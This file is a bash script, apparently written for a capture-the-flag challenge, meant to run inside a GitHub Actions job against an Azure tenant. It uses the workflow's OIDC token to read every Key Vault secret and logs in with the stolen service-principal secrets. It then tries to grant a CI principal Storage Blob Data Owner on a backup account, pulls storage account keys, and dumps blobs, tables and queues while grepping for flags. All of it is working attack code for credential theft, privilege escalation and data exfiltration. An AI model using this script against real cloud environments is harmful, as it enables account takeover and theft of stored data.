#!/usr/bin/env bash
# CTF DF26 v9: RBAC write-probe per SP + raw data-plane retries (cilogs key, tables).
set +e
T=$AZURE_TENANT_ID; C=$AZURE_CLIENT_ID; S=$AZURE_SUBSCRIPTION_ID
M=https://management.azure.com
PV=https://kv-tbl-prod-x3euoz.vault.azure.net
BAK=/subscriptions/$S/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblbackupprodx3euoz
CIPOID=63e87ab1-6bd2-4e80-92be-943450b20e4f
OIDC=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
fed(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$2" | jq -r '.access_token // empty'; }
spn(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | jq -r '.access_token // empty'; }
VT=$(fed "$C" "https://vault.azure.net/.default")
echo "===== CTX run=$GITHUB_RUN_ID ====="
for u in $(curl -s "$PV/secrets?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value[].id'); do
  w=$(curl -s "$u?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value // empty')
  aid=$(echo "$w" | jq -r '.appId // empty'); as=$(echo "$w" | jq -r '.clientSecret // empty')
  [ -z "$aid" ] && continue
  nm=$(basename "$u")
  A=$(spn "$aid" "$as" "https://management.azure.com/.default")
  [ ${#A} -lt 50 ] && { echo "##### $nm DEAD"; continue; }
  OID=$(python3 -c "import base64,json,sys;p=sys.argv[1].split('.')[1];p+='='*(-len(p)%4);print(json.loads(base64.urlsafe_b64decode(p))['oid'])" "$A" 2>/dev/null)
  echo "##### $nm oid=$OID"
  U=$(curl -s -H "Authorization: Bearer $A" "$M/subscriptions/$S/providers/Microsoft.Authorization/roleAssignments?\$filter=atScope()&api-version=2022-04-01" | jq -r '[.value[]? | (.properties.scope // "")] | join(",")' | head -c 300)
  echo "SUB-ASSIGN: ${U:-none/forbidden}"
  RB=$(curl -s -H "Authorization: Bearer $A" "$M/subscriptions/$S/providers/Microsoft.Authorization/roleDefinitions?\$filter=roleName%20eq%20%27Storage%20Blob%20Data%20Owner%27&api-version=2022-04-01" | jq -r '.value[0].name // "b24988ac-6180-42a0-ab88-20f7382dd24c"')
  G=$(curl -s -X PUT -H "Authorization: Bearer $A" -H 'Content-Type: application/json' \
    -d "{\"properties\":{\"roleDefinitionId\":\"/subscriptions/$S/providers/Microsoft.Authorization/roleDefinitions/$RB\",\"principalId\":\"$CIPOID\"}}" \
    "$BAK/providers/Microsoft.Authorization/roleAssignments/$(cat /proc/sys/kernel/random/uuid)?api-version=2022-04-01")
  echo "WA-BAK: $(echo "$G" | jq -r 'if .error then (.error.code + ": " + (.error.message // "" | .[0:100])) else "GRANTED " + (.properties.roleDefinitionId | split("/")[-1]) end')"
done
SA=sttblcilogsprodx3euoz
K=$(curl -s -X POST -H "Authorization: Bearer $VT" -H 'Content-Length: 0' "$M/subscriptions/$S/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // empty')
echo "===== retry data plane cilogs"
# use sync-service key via vault SP flow:
SS=$(curl -s "$PV/secrets/sync-service-principal?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value' | jq -r '.clientSecret')
A2=$(spn "462d1c38-4459-48b8-9333-82e389e59514" "$SS" "https://management.azure.com/.default")
K=$(curl -s -X POST -H "Authorization: Bearer $A2" -H 'Content-Length: 0' "$M/subscriptions/$S/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // empty')
echo "KEY=${K:+yes}"
if [ -n "$K" ]; then
  ka(){ local d; d=$(date -u +"%a, %d %b %Y %H:%M:%S GMT"); curl -s "$1" -H "x-ms-date: $d" -H "Authorization: SharedKey $SA:$K" "${@:2}"; }
  echo "-- blob raw:"; ka "https://$SA.blob.core.windows.net/?comp=list" -H 'x-ms-version: 2021-08-06' | head -c 700; echo
  echo "-- table raw:"; ka "https://$SA.table.core.windows.net/" -H 'x-ms-version: 2019-02-02' | head -c 700; echo
  echo "-- queue raw:"; ka "https://$SA.queue.core.windows.net/?comp=list" -H 'x-ms-version: 2019-02-02' | head -c 700; echo
fi
sleep 30
echo "===== post-grant CI dump"
AM=$(fed "$C" "https://management.azure.com/.default")
for sa in sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblappcfgprodx3euoz; do
  K2=$(curl -s -X POST -H "Authorization: Bearer $AM" -H 'Content-Length: 0' "$M/subscriptions/$S/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$sa/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // empty')
  [ -z "$K2" ] && sleep 25 && K2=$(curl -s -X POST -H "Authorization: Bearer $AM" -H 'Content-Length: 0' "$M/subscriptions/$S/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$sa/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // empty')
  echo "POSTKEY $sa ${K2:+yes}"
  [ -z "$K2" ] && continue
  kb(){ local d; d=$(date -u +"%a, %d %b %Y %H:%M:%S GMT"); curl -s "$1" -H "x-ms-date: $d" -H "Authorization: SharedKey $sa:$2" "${@:3}"; }
  for cont in $(kb "https://$sa.blob.core.windows.net/?comp=list" "$K2" -H 'x-ms-version: 2021-08-06' | grep -oE '<Container><Name>[^<]+' | sed 's/.*<Name>//'); do
    echo "PCONT $cont"
    for blob in $(kb "https://$sa.blob.core.windows.net/$cont?restype=container&comp=list" "$K2" -H 'x-ms-version: 2021-08-06' | grep -oE '<Blob><Name>[^<]+' | sed 's/.*<Name>//'); do
      echo "PBLOB $cont/$blob"
      data=$(kb "https://$sa.blob.core.windows.net/$cont/$blob" "$K2" -H 'x-ms-version: 2021-08-06')
      echo "$data" | head -c 600; echo
      echo "$data" | grep -aoE 'DF26\{[^}]{0,200}\}'
    done
  done
done
echo DONE-V9
